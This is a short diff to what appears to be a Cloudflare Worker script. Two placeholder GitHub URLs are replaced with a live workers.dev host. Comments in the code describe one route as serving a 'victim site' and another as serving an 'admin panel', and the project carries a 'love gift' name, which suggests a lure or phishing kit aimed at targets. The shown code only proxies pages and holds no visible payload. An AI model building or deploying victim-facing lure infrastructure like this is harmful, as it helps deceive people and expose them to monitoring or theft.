@@ -6,12 +6,12 @@ export default {
     
     // Serve victim site
     if(url.pathname === '/') {
-      return fetch('https://YOUR_GITHUB_USERNAME.github.io/love-access/');
+      return fetch('https://lovelygift.rajputvashu429.workers.dev/');
     }
     
     // Serve admin panel
     if(url.pathname === '/admin.html') {
-      const adminHtml = await fetch('https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/love-access/main/admin.html');
+      const adminHtml = await fetch('https://lovelygift.rajputvashu429.workers.dev/admin');
       return adminHtml;
     }
     
